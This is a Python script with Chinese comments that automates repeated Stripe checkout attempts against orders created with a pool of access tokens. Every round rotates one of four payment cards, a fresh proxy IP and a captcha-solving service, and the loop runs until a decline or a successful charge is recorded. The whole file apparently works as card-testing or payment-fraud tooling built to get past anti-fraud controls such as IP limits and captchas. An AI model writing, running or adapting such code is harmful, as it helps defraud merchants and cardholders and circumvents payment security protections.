#!/usr/bin/env python3
"""持续狩猎：新订单 + 新 AT + 新 sid，跑到命中 decline 为止。

用法：ROUNDS=50 TARGET=1 python hunt.py
"""
from __future__ import annotations

import json
import os
import random
import sys
import time
from pathlib import Path

sys.path.insert(0, "/tmp")
from sp import StripeProtocol
from loop_test import make_order, new_proxy, egress_ip, BILLING

CARDS = [
    {"number": os.environ["CARD_A_NUMBER"], "exp_month": os.environ["CARD_A_EXP_MONTH"], "exp_year": os.environ["CARD_A_EXP_YEAR"], "cvc": os.environ["CARD_A_CVC"]},
    {"number": os.environ["CARD_B_NUMBER"], "exp_month": os.environ["CARD_B_EXP_MONTH"], "exp_year": os.environ["CARD_B_EXP_YEAR"], "cvc": os.environ["CARD_B_CVC"]},
    {"number": os.environ["CARD_C_NUMBER"], "exp_month": os.environ["CARD_C_EXP_MONTH"], "exp_year": os.environ["CARD_C_EXP_YEAR"], "cvc": os.environ["CARD_C_CVC"]},
    {"number": os.environ["CARD_D_NUMBER"], "exp_month": os.environ["CARD_D_EXP_MONTH"], "exp_year": os.environ["CARD_D_EXP_YEAR"], "cvc": os.environ["CARD_D_CVC"]},
]

ROUNDS = int(os.environ.get("ROUNDS", "30"))
TARGET = int(os.environ.get("TARGET", "1"))


def main() -> None:
    ats = json.loads(Path("/tmp/at_list.json").read_text())
    random.shuffle(ats)

    hits: list[dict] = []
    tried: list[dict] = []
    at_idx = 0
    hit_count = 0

    print(f"AT 池 {len(ats)} 个，目标命中 {TARGET} 次，最多跑 {ROUNDS} 轮")
    print("=" * 60)

    for i in range(ROUNDS):
        if hit_count >= TARGET:
            print(f"\n达到目标 {TARGET} 次命中，停止")
            break

        at = ats[at_idx % len(ats)]
        at_idx += 1
        card = CARDS[i % len(CARDS)]
        tag = "****" + card["number"][-4:]

        print(f"\n[{i+1}/{ROUNDS}] 卡 {tag}  AT ...{at[-8:]}")

        order = make_order(at)
        if not order:
            print("  建单失败")
            tried.append({"round": i+1, "state": "order_failed"})
            continue

        proxy = new_proxy() or os.environ.get("ORDER_PROXY")
        ip = egress_ip(proxy)
        print(f"  订单 {order['order'][:8]}  IP={ip}")

        sp = StripeProtocol(
            proxy=proxy,
            captcha_key=os.environ.get("GSS_CAPTCHA_API_KEY", ""),
            captcha_url=os.environ.get("GSS_CAPTCHA_API_URL", "https://api.yescaptcha.com"),
            card=card, billing=BILLING,
        )
        try:
            out = sp.pay_from_url(order["url"])
            rec = {
                "round": i+1, "card": tag, "ip": ip, "order": order["order"],
                "state": out.state, "decline": out.decline_code,
                "code": out.code, "charge": out.charge_id,
                "message": (out.message or "")[:80],
            }
        except Exception as e:
            rec = {"round": i+1, "card": tag, "ip": ip, "state": "error",
                   "message": str(e)[:100]}
        finally:
            sp.close()

        tried.append(rec)
        if rec["state"] in ("card_declined", "paid"):
            hit_count += 1
            hits.append(rec)
            print(f"  ★★★ 命中 {rec['state']} decline={rec.get('decline')} "
                  f"charge={rec.get('charge')}")
        else:
            print(f"  → {rec['state']}")

        Path("/tmp/hunt_result.json").write_text(json.dumps(
            {"hits": hits, "tried": tried, "hit_count": hit_count}, indent=1))

    print("\n" + "=" * 60)
    print(f"完成：{len(tried)} 轮，命中 {hit_count} 次")
    for h in hits:
        print(f"  ★ {h['card']} {h['state']} decline={h.get('decline')} charge={h.get('charge')}")


if __name__ == "__main__":
    main()
